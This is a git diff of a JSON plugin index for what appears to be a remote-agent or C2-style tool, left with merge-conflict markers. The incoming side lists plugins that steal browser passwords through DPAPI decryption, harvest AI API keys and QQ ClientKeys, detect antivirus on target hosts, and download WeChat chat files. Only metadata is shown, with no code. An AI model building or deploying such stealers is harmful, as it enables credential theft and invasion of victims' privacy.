@@ -1,4 +1,5 @@
 {
+<<<<<<< HEAD
   "schemaVersion": 1,
   "generatedAt": "2026-08-27T10:56:17.7518444Z",
   "pluginCount": 5,
@@ -50,3 +51,65 @@
     }
   ]
 }
+=======
+    "schemaVersion":  1,
+    "generatedAt":  "2026-08-31T06:07:04.8539070Z",
+    "pluginCount":  6,
+    "plugins":  [
+                    {
+                        "pluginId":  "com.example.plugin-sdk",
+                        "name":  "插件开发 SDK 示例",
+                        "version":  "2.0.0",
+                        "author":  "libra",
+                        "description":  "全能力演示插件（活文档）：Agent 端 JS 多平台 API、服务端 C# 脚本（多文件）、前端宿主 API、docs 在线文档 全部可选项。",
+                        "file":  "plugins/com.example.plugin-sdk/plugin-sdk.zip",
+                        "size":  43521
+                    },
+                    {
+                        "pluginId":  "com.libra.aitoken",
+                        "name":  "AI APIKey Recon",
+                        "version":  "1.0.0",
+                        "author":  "libra",
+                        "description":  "扫描本机AI Agent的 API Key。",
+                        "file":  "plugins/com.libra.aitoken/aitoken.zip",
+                        "size":  1208524
+                    },
+                    {
+                        "pluginId":  "com.libra.av-list",
+                        "name":  "杀软检测",
+                        "version":  "1.0.0",
+                        "author":  "libra",
+                        "description":  "获取 Agent 进程列表，识别目标主机安装的杀毒软件/安全防护产品。",
+                        "file":  "plugins/com.libra.av-list/av-list.zip",
+                        "size":  12034
+                    },
+                    {
+                        "pluginId":  "com.libra.browser-stealer",
+                        "name":  "浏览器数据",
+                        "version":  "1.0.0",
+                        "author":  "libra",
+                        "description":  "读取 Chrome/Edge 浏览器密码与历史记录（DPAPI 解密），支持搜索与 CSV 导出。",
+                        "file":  "plugins/com.libra.browser-stealer/browser-stealer.zip",
+                        "size":  93741
+                    },
+                    {
+                        "pluginId":  "com.libra.qqkey",
+                        "name":  "QQ ClientKey Recon",
+                        "version":  "1.1.0",
+                        "author":  "libra",
+                        "description":  "探测本机 QQ ClientKey",
+                        "file":  "plugins/com.libra.qqkey/qqkey.zip",
+                        "size":  1783219
+                    },
+                    {
+                        "pluginId":  "com.libra.wechat-file",
+                        "name":  "WeChat 文件",
+                        "version":  "1.0.0",
+                        "author":  "libra",
+                        "description":  "扫描本机微信（xwechat_files）账号与消息文件目录，浏览/下载聊天文件。",
+                        "file":  "plugins/com.libra.wechat-file/wechat-file.zip",
+                        "size":  105402
+                    }
+                ]
+}
+>>>>>>> 7ddb1f2 (ci: rebuild plugin index (HTML packages, UTF-8 no BOM))
